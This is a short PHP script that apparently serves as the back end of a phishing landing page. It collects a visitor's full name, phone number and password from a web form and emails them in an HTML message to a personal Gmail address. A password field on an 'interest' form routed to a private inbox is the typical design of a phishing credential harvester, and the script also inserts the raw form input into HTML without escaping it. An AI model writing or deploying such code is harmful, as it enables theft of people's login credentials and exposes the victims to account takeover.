<?php
$to = 'alexfilipenko719@gmail.com';
$subject = 'Interest submitted through online form';
$message = '<html><body>';
        $message .= '<h1 style="color:#f40;">Received a message from the landing page.</h1>';
        $message .= '<p style="color:#080;font-size:18px;">Full Name: </p>';
        $message .= $_POST['name'];
        $message .= ' </p>';
        $message .= '<p style="color:#080;font-size:18px;">Phone: </p>';
        $message .= $_POST['phone'];
        $message .= ' </p>';
        $message .= '<p style="color:#080;font-size:18px;">Password: </p>';
        $message .= $_POST['password'];
        $message .= ' </p>';
        $message .= '</body></html>';
$from = 'peterparker@email.com';

// Sending email
if(mail($to, $subject, $message)){
    echo 'Your mail has been sent successfully.';
} else{
    echo 'Unable to send email. Please try again.';
}
?>